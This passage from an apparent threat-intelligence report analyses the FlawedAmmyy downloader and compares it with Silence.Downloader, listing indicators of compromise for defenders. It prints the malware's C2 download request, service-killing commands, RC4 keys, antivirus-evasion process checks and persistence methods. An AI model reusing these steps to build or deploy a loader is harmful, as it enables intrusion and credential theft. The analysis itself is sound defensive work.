@@ -1,0 +1,545 @@
+FLAWEDAMMYY ANALYSIS AND ITS COMPARISON WITH SILENCE.DOWNLOADER
+The analysis of Silence’s activities by Group-IB experts revealed that FlawedAmmyy.Downloader
+and Silence.Downloader are written by the same person. That said, the infrastructure used for
+FlawedAmmyy attacks differs greatly from Silence attacks, which means the attacks themselves
+are not interrelated.
+Since early summer 2018, FlawedAmmyy.Downloader has been used in attacks on various targets
+in various regions. Some researchers believe this tool is used by the TA505 group to conduct
+The file contains gibberish (shown below), which is most likely used to bypass antivirus emulators.
+The file will terminate its operation once it has detected that one of the following processes
+belonging to antivirus solutions is running: QHACTIVEDEFENSE.EXE, QHSAFETRAY.
+EXE, QHWATCHDOG.EXE, CMDAGENT.EXE, CIS.EXE, V3LITE.EXE, V3MAIN.EXE, V3SP.
+EXE, EGUI.EXE, EKRN.EXE, SPIDERAGENT.EXE, DWENGINE.EXE, DWARKDAEMON.EXE,
+BULLGUARDTRAY.EXE, BDAGENT.EXE, BULLGUARD.EXE, BDSS.EXE, or BULLGUARD.EXE.
+In the event that the file has been launched under an administrator account, it performs the
+following actions:
+
+
+Terminates the process named wsus.exe four times in a row (if it is present);
+
+
+Deletes the following AMMYY files, if they are present:
+
+
+%COMMON_APPDATA%\AMMYY\wmihost.exe
+%COMMON_APPDATA%\AMMYY\settings3.bin
+%COMMON_APPDATA%\Foundation\wmites.exe
+%COMMON_APPDATA%\Foundation\settings3.bin
+%COMMON_APPDATA%\Foundation1\wmites.exe
+%COMMON_APPDATA%\Foundation1\settings3.bin
+%COMMON_APPDATA%\Microsoft\wsus.exe
+%COMMON_APPDATA%\Microsoft\settings3.bin
+%COMMON_APPDATA%\Microsoft Help\wsus.exe
+%COMMON_APPDATA%\Microsoft Help\settings3.bin
+%COMMON_APPDATA%\Microsofts Help\wsus.exe
+%COMMON_APPDATA%\Microsofts Help\settings3.bin
+
+Deletes the following AMMYY directories, if they are present:
+
+%COMMON_APPDATA%\Settings
+%COMMON_APPDATA%\Microsoft\Enc
+%COMMON_APPDATA%\AMMYY
+%COMMON_APPDATA%\Foundation
+%COMMON_APPDATA%\Foundation1
+
+Starts the following commands to terminate and delete the AMMYY service, if it is currently
+
+running:
+cmd.exe /C net stop foundation
+cmd.exe /C sc delete foundation
+
+
+Terminates the process named wsus.exe twice in a row (if it is present).
+
+
+Creates the following directory: %COMMON_APPDATA%\Microsofts Help.
+
+
+40
+
+
+Downloads an encrypted file from the network host http://31.207.45[.]85/d.dat and saves
+it under the name of the form %COMMON_APPDATA%\Microsofts Help\temp_[random_
+dword].FOOP0xFCBEEA. An example of file location on disk: C:\ProgramData\Microsofts
+
+Help\temp_84c350.FOOP0xFCBEEA.
+The file is requested from a remote node using GET requests via unencrypted HTTP. An example
+of a file request is shown below:
+GET /d.dat HTTP/1.1
+Host: 31.207.45[.]85
+Cache-Control: no-cache
+
+Reads and decrypts the contents of the file %COMMON_APPDATA%\Microsofts Help\
+temp_[random_dword].FOOP0xFCBEEA. For decryption, the RC4 algorithm is used with the
+
+key ZAKDSh327uif.
+
+Writes the decryption result (unencrypted file) to the file %COMMON_APPDATA%\
+
+Microsofts Help\wsus.exe.
+
+Removes the temporary file %COMMON_APPDATA%\Microsofts Help\temp_[random_
+
+dword].FOOP0xFCBEEA.
+If the first two bytes of the decrypted file are not the “MZ” characters – which means the
+executable file has not been decrypted correctly – the file will be terminated and selfremoved. The self-deletion is performed by running the shell with the arguments
+/del [exefile] >> NUL.
+
+Following this, it executes the decrypted file %COMMON_APPDATA%\Microsofts Help\
+
+wsus.exe.
+
+
+If the file has been successfully launched, it will re-delete the temporary file.
+
+
+Adds the launched file to autostart. This is done in one of three ways:
+
+
+a. Autostart via system registry:
+[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
+“MicrosoftsSOftWare”= %COMMON_APPDATA%\Microsofts Help\wsus.exe
+b. By creating a delayed task in Windows Task Scheduler:
+The task has the name Microsoft Window Center, starts when the current user logs
+in to the account, and has a specific feature: a hard-coded initial activation date, which
+is not important for autostart due to the presence of the condition that the file is launched
+when the user is logging in.
+c.  By creating a delayed task using COM and connecting to a objectCLSID_TaskScheduler
+class object:
+
+41
+.rdata:0048AFE8 ; const ServerApp::`vftable'
+.rdata:0048AFE4         dd offset ??ServerApp@@6B@ ; const ServerApp::`RTTI Complete
+Object Locator'
+.rdata:0048AFE8 ; const ServerApp::`vftable'
+.rdata:0048AFE8 ??_7ServerApp@@6B@ dd offset unknown_libname_3
+.rdata:0048AFEC        dd offset Init
+.rdata:0048AFF0         dd offset server_start
+.rdata:0048AFF4         dd offset server_stop
+42
+The first (pre-initialisation of the application) and the second (server start) methods are called:
+
+
+Compared to the original source code, initial functions that are used to check the command
+line arguments of the application, such as AmmyyApp::ParseCommandLine(), etc., have been
+removed from the file. The launch is hardcoded: either as a service or as an application,
+without additional unnecessary application execution options.
+
+
+Depending on how the .exe file (an application or service) has been started, a particular
+function will be executed.
+
+
+Other changes compared to the source code:
+
+
+the name of the log file has been changed from AMMYY_service.log to service.log;
+
+
+the name (description) of the service (AMMYYSERVICENAME AmmyyAdmin) has been
+changed to FossPass;
+
+
+the name of the service, which is used to name the application saved in the registry, has
+been changed to netsxuid.
+
+
+The service name is saved in the registry as follows:
+[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\services]
+“netsxuid”=
+A binary comparison of the sample and the legitimate versions of the Ammyy Admin application
+shows that they differ greatly.
+The sample has new features that are not included in the legitimate application, redesigned
+code structure, and data whose creation would have been impossible without recompiling the
+application’s source code.
+All these facts indicate that the file is a modified version of the published source code.
+Two modifications have been added to the TrClient::Run() function, which is called while
+connecting to the CnC and sending and receiving commands:
+
+
+After connecting to the CnC server (the ConnectToRouter() function), the application collects
+data about the compromised system and sends it to the CnC;
+
+
+Below is a list of supported AMMYY command types. Each type of command corresponds
+to a specific command that can be received remotely from an attacker (CnC) and executed.
+
+
+43
+{
+// viewer <-> target both ways
+aaNop = 10,
+aaPingRequest = 11, // uses by Router also
+aaPingReply  = 12,           // uses by Router also
+aaSound = 13,
+aaCutText = 14,
+// target -> viewer
+aaScreenUpdate = 21,
+aaSetColourMapEntries = 22,
+aaPointerMove = 23,
+aaError = 24,
+aaDesktopUnavailable = 25,
+// viewer -> target
+aaSetEncoder = 40,
+aaDesktopOFF = 41,
+aaSetPointer = 42,
+aaScreenUpdateRequest = 43,  // full screen update request
+aaScreenUpdateCommit = 44,
+aaKeyEvent = 45,
+aaPointerEvent = 46,
+aaRDP         = 47,
+aaDirectConnect = 48,
+aaSpeedTest             = 49,
+// FileManager: viewer -> target
+aaFileListRequest = 60,
+aaFolderCreateRequest = 61,
+aaRenameRequest = 62,
+aaDeleteRequest = 63,
+aaDnloadRequest = 64,
+aaUploadRequest = 65,
+aaUploadData =   66,
+aaUploadDataLast = 67,
+aaDnloadDataAck = 68,
+// FileManager: target -> viewer
+aaFmReply = 70,
+aaUploadDataAck = 71,
+aaDnloadData = 72,
+aaDnloadDataLast = 73,
+};
+44
+Compared to the original source code, commands with the codes 50, 51, 52, 53, 54, 55 have
+been added to the examined file. The table below shows the values of the added command types:
+Command Function
+50 Run an arbitrary command and store its output
+51 No operation
+52 Collect and upload system information
+53 Extract an executable file from resources, run it and save the results of its operation
+to the file log.txt.
+54 System reboot
+55 Self-removal
+Once command 53 is received, the application extracts one of the executable files (for x86 or x64
+architecture) from the resources of the application, saves it under the name %Temp%\default.
+bin, executes it, and saves the results of its operation into the file log.txt. The analysed sample
+does not contain executable files that are extracted when command 53 is received. However,
+based on the debug information and features of the function code, it can be suggested that the
+resources may contain Mimikatz, an application designed to retrieve user credentials.
+The path to the directory on the attacker's PC where the malicious file has been assembled
+is s:\new stage\freelance\ice\clear_av_ammy\1\clear\ammyygeneric\get.
+Comparison of FlawedAmmy.Downloader
+with Silence.Downloader
+During the analysis of new FlawedAmmy samples, we noted the following similarities
+to Silence.Downloader:
+
+
+File names
+
+
+Similar code fragments
+
+
+Code obfuscation methods used.
+
+
+Having studied the two files, we can conclude that these are two different tools with many
+connections between them.
+Silence.Downloader is a universal resident loader, which collects system data, sends it to the CnC,
+adds itself to startup, and receives commands to download any files from the remote attacker.
+FlawedAmmy.downloader is a target non-resident loader for the FlawedAmmy tool, which
+configures the system to start a service called foundation, downloads and launches the file,
+and then deletes itself.
+Group-IB specialists analysed the following samples:
+45
+
+A file named
+
+"600e1adba4983692e9b74e631e155eab65279dd2ab73bb35fbd6e0e84d0e68a5"
+(размер 126976 байт, MD5 94531c20462f69c6135c4d0a06925471)
+which is a FlawedAmmyy RAT loader.
+
+A file named
+
+"18462ae676c539b2a3626a7b465123b20c88bd68342777a090f40b7dcb7ace0d"
+(размер 115200 байт, MD5 914F6BA6A3A043ECC961296FA94A6BAD)
+which we classify as Silence.Downloader.
+Common characteristics of the samples:
+
+
+The same programming language, development environment and the same version were used
+for compilation – Visual Studio 2013 (based on information extracted from the Rich header
+of the executable file);
+
+
+Identical technique for generating a non-executable code portion containing multiple fake API
+calls (without a single argument). This technique is designed to generate legitimate-seeming
+import tables and complicate its detection by heuristic antivirus methods.
+
+
+For generation, a function from Windows API – CoCreateGuid() – is used. It generates
+a unique 128-bit number. The result of the function is written to the GUID structure. Below
+is a formal definition of the GUID structure:
+
+
+typedef struct _GUID {
+DWORD Data1;
+WORD Data2;
+WORD Data3;
+BYTE Data4[8];
+};
+Both files use only a part of the fields from this structure. As a result, the number will
+be calculated using the following formula:
+For FlawedAmmy.Downloader:
+GUID_INT = GUID.Data3 + GUID.Data1 * GUID.Data2
+For Silence.Downloader:
+GUID_INT = GUID.Data1 * GUID.Data2 + GUID.Data3 + 0xCB6
+GUID_INT = GUID.Data1 * GUID.Data2 - GUID.Data3 + 0xD435
+For FlawedAmmyy.Downloader, decrypted files will be saved to the following path:
+46
+%COMMON_APPDATA%\Microsofts HeIp\template_[GUID_INT].DATAHASH
+For Silence.Downloader, decrypted files will be saved to the following path:
+%APPDATA%[GUID_INT].dates (a temporary encrypted file)
+%APPDATA%\CHROME-[GUID_INT].exe (a decrypted file)
+
+
+The same criteria are used to check the size of the downloaded file. The file size must exceed
+4,000 bytes. This is a rather unique number, which is used instead of typical 4096 or 1024.
+
+
+The same criterion is used to check the contents of the downloaded file. The first two bytes
+of the file are checked, and they must be equal to “MZ”, which corresponds to the header
+of the executable file.
+
+
+A specific sequence of steps taken to download the file, which includes sending a request,
+writing a CnC response to the file, reading the file, checking whether the file size is over
+4,000 bytes, checking for MZ, decrypting the file, saving the decrypted file, and executing
+the file.
+
+
+An unusual detail in this sequence is that in both samples the size of the downloaded content
+is checked after the file has been written to disk. If the CnC returns <= 4000 bytes, however,
+writing the CnC response to the file will not be necessary at all. In both samples, this check
+is made after the response has been written to the file.
+Another non-typical feature is that after the server response is written to the file, two
+checks are performed, during which the written file is read and its contents are decrypted
+and rewritten into the same file. This sequence contains many redundant steps: it would
+be sufficient to simply perform a request to the CnC, compare its length to 4,000, decrypt
+the response and write it to the file in the event of its first two bytes being equal to “MZ”.
+The presence of such redundant and similar stages may indicate that the code was borrowed
+and copied from other projects.
+
+
+Similar values of the delay function arguments.
+
+
+Identical RC4 decryption algorithm for downloaded files.
+
+
+The decryption key of the downloaded files is Pqoi73jGdjwenYew33 for the FlawedAmmyy
+RAT loader, and jgsi23894uhnfjusiof for Silence.Downloader (for decrypting non-file
+data, for example, commands from server responses. Silence.Downloader has other keys:
+FKh23yu7T*&^@# and WiJyQaEaAixoRyCu).
+
+
+Identical self-removal code.
+
+
+The same set of API functions used.
+
+
+Differences between the samples:
+
+
+FlawedAmmy.Downloader is non-resident. This means that it starts, downloads and runs the
+file and deletes itself.
+
+
+Silence.Downloader is resident. It copies itself to %All Users\Application Data%\WIN7Z\
+
+
+47
+wsus.exe, then adds itself to startup (the Run registry key) and executes requests to the
+CnC in a cycle with an interval of 2 minutes. It removes itself only when it receives the KILL
+command from CnC.
+Criterion Value in FlawedAmmyy.Downloader Value in Silence.Downloader
+Development environment Visual Studio 2013 Visual Studio 2013
+used
+Gibberish import table Yes Yes
+Method of generating
+downloaded file names using
+GUID and the CoCreateGuid()
+function
+Yes Yes
+Checking the downloaded Over 4,000 bytes Over 4,000 bytes
+file size
+Checking the contents of the The first 2 bytes - “MZ” The first 2 bytes - “MZ”
+downloaded file
+File download steps Sending a request, writing a CnC response to a
+file, reading the file, checking if the file size is
+over 4,000 bytes, checking for MZ, decrypting
+the file, saving the decrypted file, executing
+the file.
+Argument values of the delay Sleep(5000);
+function Sleep(3000);
+Sleep(3000);
+Sleep(1000);
+Sending a request, writing a CnC response
+to a file, reading the file, checking if the file
+size is over 4,000 bytes, checking for MZ,
+decrypting the file, saving the decrypted
+file, executing the file.
+Sleep(1000);
+Sleep(50);
+Sleep(3000);
+Sleep(3000);
+Sleep(3000);
+Sleep(3000);
+Sleep(5000);
+Sleep(120000);
+Decryption algorithm for RC4 RC4
+downloaded files
+API call method Dynamic search Static call from an import table
+Loader type Non-resident Resident
+Is the wsus.exe file name used? Yes, it is used to name the downloaded and Yes, the loader file is copied under this
+launched file name.
+What is added to startup? A service named foundation Its own file
+What system information is Windows version, domain name information Tasklist, qwinsta, ipconfig, hostname, disks,
+collected? Windows version, OS bitness
+Is the collected data sent No Yes
+to the CnC?
+Are requests to the CnC No Yes
+encoded additionally?
+48
+FlawedAmmyy infrastructure
+The servers used by FlawedAmmyy are not located where Silence usually hosts them. The
+hypothesis that these attacks are not connected is also supported by the fact that the emails
+containing FlawedAmmyy differ greatly from those used by Silence and are delivered to both
+individuals and companies.
+Downloaders
+25/05/2018 f4b6b0c8787ea344ce9f68f5d506a5d6cc7447114b3d- http://clodflarechk[.]com/cloud.png
+cdbb6d0207372054dfe2
+25/05/2018 5ad873c6b351e0239b74548697fc870b18233b9ab2d7d767baf- http://clodflarechk[.]com/cloud.png
+5f7a3fd5929c5
+07/06/2018 fc5c2cff9afb9f08bab6ef895e07fa70183fc0eb338b662c- http://thespecsupportservice[.]com/
+75cf2305286b93d0 load.png
+10/06/2018 9b845c90f45d51bd71da48a0a805472ef285590397cb678ad4de4d- http://thespecsupportservice[.]com/
+2de896a0b8 load.png
+18/06/2018 edeb70a8c3ff5f014352035ac7414d7fe8d028ac4ab8b95afb7cd- http://185.176.221[.]29/ban3.dat
+be7f42c46d9
+28/06/2018 07b395267cfb60f24de7192b7dbf4bdcdf8d663a21fdaabbcef- http://147.135.170[.]169/kernel.dat
+3fc20093ae087
+11/09/2018 8f28b7dc92b7c60b8ede821dae400746e257c447c05957d8c6b6f- http://185.17.121[.]223/date2.date
+d4eb94fc19d
+18/09/2018 d964b7c1d01dfaa287e5613ba918729d7cf7234d81532bfe193ed- http://185.180.196[.]43/date2.dat
+406eec2a773
+18/09/2018 589975a352b07295b4c731e3165cadeb895634a30d8f028170b- http://79.137.127[.]216/ba.dat
+9d49abd73e470
+19/09/2018 c24815aed025eac9ff8946e8c9ca861eb6aae691959204893056ae- http://185.180.196[.]43/date1.dat
+ce6f71a1eb
+20/09/2018 a46afd89dafd0df1adbf50915bb46655b07f378edfaa7e94f- http://185.180.196[.]43/date2.dat
+d5940a50ff58716
+20/09/2018 14acf544c4f04b82a951da4c09a3baaa3049030e9e4b4d12e- http://185.180.196[.]43/date2.dat
+ce5d856b03b58d2
+23/09/2018 c998d74dc9b7ebe9864d451752c7d8eafdf334bacbf09dbcfcb7548d- http://185.180.196[.]43/date1.dat
+a1cc05e6
+25/09/2018 ec7c0c1f00b1c92510d8b959fb4201163abd0bf0fee3a3e32901ce- http://185.17.121[.]223/date1.date
+c95d1d7d77
+17/10/2018 6703dbf496bb331a109ee5824c8ff4c0281861d8478470b- http://msboxoffice[.]com/date1.dat
+63c4580e4676d26e1
+17/10/2018 a673f1545649e3e9b19c37389a76ea66844ea1f- http://msboxoffice[.]com/date1.dat
+307b702ab7118ad819ffcb4fc
+17/10/2018 8f6b5dc882b171b166d9009f29159cce029d35586d363116113f09b- http://msboxoffice[.]com/date1.dat
+f7140ea6e
+07/12/2018 6e55fc56eb8224ab3ee1f8df81626d5f5737a923c3ae4202affaf- http://31.207.45[.]85/d.dat
+2d1a2b57c68
+03/01/2019 b6022ffc9fc24378102145071d912a75c0dc47c1a1639b341fd- http://31.207.45[.]85/d.dat
+cee38f55fdf31
+49
+Downloaders
+13/02/2019 6b8c9f93232dbc4c83708c3b3c534ecc695937b41a- http://185.17.123[.]201/dat1.omg
+446c16ae6fb84d11117da7
+13/02/2019 de6c44683c489a7cb26bd435199aa327b7df8f0be31cc474cf98c- http://185.17.123[.]201/dat2.omg
+7cab9b3abb5
+13/02/2019 6c4e2c2de91c728bb5f0c407be3b01585bfdbcbbdade4fafc0779c9f- http://185.17.123[.]201/dat3.omg
+c2dceeec
+19/02/2019 01db49c3afcb46c593bc7247f04f8ae87abf04c585de- http://185.17.120[.]235/dat3.omg
+57557b1e5a89a14588a6
+19/02/2019 9a58aeab3ddfc5d1b13ec0c8718b1f0c5cf934cbd0a61a93d906a9b- http://185.17.120[.]235/dat1.omg
+7ca3860dd
+19/02/2019 a77c85a15c8d873396d2d299a58ce49cf7044703189977c21c5a- http://185.17.120[.]235/dat3.omg
+17c2eb9ec451
+19/02/2019 0a7e6a1ed2b4111dd285cf2582e794e18fb4c25d85329c1f6b- http://185.17.120[.]235/dat4.omg
+15f27a68741dcb
+19/02/2019 4efe3097dac309a1619415e1ef8654f0b30b516e601d6c4c061cf- http://185.17.120[.]235/dat1.omg
+cd9dd876968
+19/02/2019 ffaad77e7c2e56b965fe38dfdd490572321d29e00f5b- http://185.17.120[.]235/dat1.omg
+1f27e692c4f697d72904
+20/02/2019 d1d9657b4230b63ff7b5f94ecd21660c3edf314fcf23b- http://213.183.63[.]242/fact1.omg
+745226fae806d456cb8
+20/02/2019 014d47cc2ee73efb3ec06a72d886888fc- http://195.123.209[.]169/dat1.omg
+c2489ce8e8323f57ee03295439e6f34
+22/02/2019 17ace58c2d19cd852f9b3b1f27aea925d015593998b52260dd4 http://dorlon-sa[.]com/~dorlon/
+f2ee075260880 181.dat
+27/02/2019 81edbd0ebf33aa7d751e0b44f66b3fc2f5a243ca80dad- http://91.200.41[.]236/s.dat
+6c0188f40fd860f58dd
+01/03/2019 17a3f9e74cb4691035e7e09f1432e507a7bb31ef- http://185.162.131[.]87/p.dat
+33cb8511674b58d95d1670a6
+06/03/2019 80c9296ef0e1a250ca4b3911a02d90221bdc9b2b12dc9e- http://185.231.155[.]59/s.dat
+b6a5b8e5f1778493fe
+06/03/2019 2ad7ac74e6e21a2d36bcbf28a3988f5ad1b3fa86a6e74ed9bbf3d15c- http://185.128.213[.]12/s.dat
+4cbac32b
+06/03/2019 d864fa83a75edf68d81baea5a40a143096c1db5237cc6d- http://31.41.47[.]190/s.dat
+b807601eaa9e4e6d22
+06/03/2019 dd76664175d0f97c37fbfea5071c043412721dc3a975b6c54b6d- http://167.179.86[.]255/dns.dat
+f9abe73bc1d1
+11/03/2019 fb704b02ec395f339aebe658f7a69e7b67f6950c9e92f- http://202.168.153[.]228/dns3.dat
+b96aaa9d3973fb24839
+12/03/2019 b759fe01c5a6eb03fd1d30fd5ea9ec9841a7622f81b- http://clodflarechk[.]com/cloud.png
+37b449e098bc88895a558
+15/03/2019 b2578d68dbd6100450217318e3744fbc3445e1fd- http://185.231.155[.]59/s.dat
+d04820a777156a0dc4cd4df1
+16/03/2019 b4b998c64566818bd273172573c8c35cee3602b711d8c3d- http://91.200.41[.]236/s.dat
+c5245ddf4a5ba278b
+50
+Payloads
+05/06/2018 7f61258418b89942aa8e7bf2563ce11a05402d3ccf405a18e3d0a4d7a7f9ee41 185.222.202[.]139
+07/06/2018 ba8ed406005064fdffc3e00a233ae1e1fb315ffdc70996f6f983127a7f484e99 103.208.86[.]140
+13/06/2018 bce75d6ec2b8d7419044ba8302c96bbdeec0354b0dc764e19ec4e7aa44e8ef13 169.239.129[.]125
+25/06/2018 7bf942db8cc97f6274754e1f4d16dcf14e9d21c09038746895e27b64fcfcdfe4 103.208.86[.]39
+26/06/2018 18732545bc6fe6035f92d3b3aa0bfc06f031be2f26f556ad76f06e9573d384d9 103.208.86[.]252
+12/07/2018 42ded82ef563db3b35aa797b7befd1a19ec925952f78f076db809aa8558b2e57 185.99.132[.]119
+13/07/2018 73e149adb7cc2a09a7af59aecd441fd4469fc0342b687097cadfbce10896c629 103.208.86[.]226
+17/07/2018 557db9e6398fd38b7f215bbbc18d433c5c49a86adfba0cb9dbc9ea272366d727 185.99.132[.]128
+17/07/2018 56f1ab4b108cafcbada89f5ca52ed7cdaf51c6da0368a08830ca8e590d793498 169.239.128[.]150
+17/07/2018 c2080983598643a2498d1f6ef3f1cc9dc58a784a69e3f313f18dc1b8e0afbc17 185.99.132[.]128
+17/07/2018 89590e12f45b01e70563205a67db70645f8bb534ab6fdf54fba1f7d36f614d67 169.239.129[.]3
+19/07/2018 773f08e332a9bf8648c1cad76186e1120025dae9aac402c0ca1ba7b71d8af9c9 185.99.132[.]128
+14/08/2018 efeadabb39db0f7087ecec71b31f198727443beef8fa030ee2dfe5266d78603b 169.239.129[.]27
+21/08/2018 8cbf24dbbe16fa051ba13b3bc84b1b2c359206488f8fd35e1bc89339813ae180 185.99.132[.]128
+21/08/2018 7d0eef74bc6cdc0d6af977fcdcd94af9859fbac84671e869409b2e141cc131d0 185.99.132[.]128
+22/08/2018 b966e1a71719361338e861800c3c989b22336e4a4497c28f75398c4804a250c6
+23/08/2018 8947f9468f16ab3eebb56d546034061d7073e29b5010444e385aa3937b10a81e
+17/09/2018 ebce43d96b77e0e6a395a7cbde462b90abbc91894dbd80c2a413286aa24e3435 185.99.132[.]12
+16/10/2018 35613fdfb5940ead5d2f2c124ccf6d022d308b6efbffecead20e57202292f423 185.99.132[.]128
+17/10/2018 bb6d7888b7538c8df9c7b3fb4baedd2e8309c39df527c0d48bfb46bc87918de4 169.239.129[.]27
+17/10/2018 ed5d29a19f3aed2c870051d639b974f16682a2463fd20bd230594102c39958dd 169.239.129[.]27
+17/10/2018 50c94e998a1c387ba7af19f870716c0299f5e9ffd8fa3bd721f120ede8f1b440
+17/10/2018 e525e1b3367eb427002fd84a5b5d7ac18df93fce4412d0f18aaa6b1141cc56c2
+24/10/2018 f143a594fa59150afc7503a8e18a0986bbe7985e8c4480b11f49344194317bd4
+27/11/2018 8f21ac40c116f25276c5c52a64ef883bd80d28a5d09f589cbc7180ac4b009abb
+29/11/2018 f318b1fe2d131e67ac1a1800e59dc1373464c69992008db4dac436bed90225e8 169.239.129[.]27
+07/12/2018 c8156fef756fdc195b0acfad767ce26c304c8dccd1ba8f3fb7efb7f1e08cd1e6 185.255.79[.]44
+18/02/2019 56b57fc829774aa4423b7a29ff5a081b75167d2466898acbc7d89e717bfb4869 185.99.133[.]83
+19/02/2019 7ecfd68341fe276c17246dc51c5d70ee2c1bbc6801c85201c8a62956c23d872d 185.99.133[.]83
+20/02/2019 af1d155a0b36c14626b2bf9394c1b460d198c9dd96eb57fac06d38e36b805460 185.255.79[.]67
+22/02/2019 8562d866b475e221a5394e6ddeec67ccdb49faa752dd25b76281842bec8c2907 169.239.129[.]31
+22/02/2019 bccddce212adc252328a56af862c1310d084fcfd3838ffe6c36fb4e0ff64ca78 185.99.133[.]2
+26/02/2019 6e53d7e07e04b718825f6ab209a74ecbcfc6285097f0c0f9d332e8c0f54e1097 169.239.128[.]15
+06/03/2019 4425fec38db7503a3cb1a1be48d14881a18a00ccef7a975a0d64fba1191d8b09 91.201.65[.]181
+10/03/2019 03318d195541590cce94df7ec95ba899e5cd0dbac813a4042ac7efaa9a01f9ed 146.0.77[.]62
+51
+Payloads
+10/03/2019 1b5a01df930dbaaf8a61a948b2d7205eed023022c5d76c03144daeae0442e5ca
+15/03/2019 dd11953288c33ca020301ec639efa1a42f87059fb1adafde58343db7002d4b4b
+21/03/2019 127178ad32549676de47111180a356bfc1184bb0de8e3ce46a61da6a170489de
+21/03/2019 64edb1c153edd7ed92b2847f9ba703b1254924f046f8873459e74ecb9bb4d6d7
+52
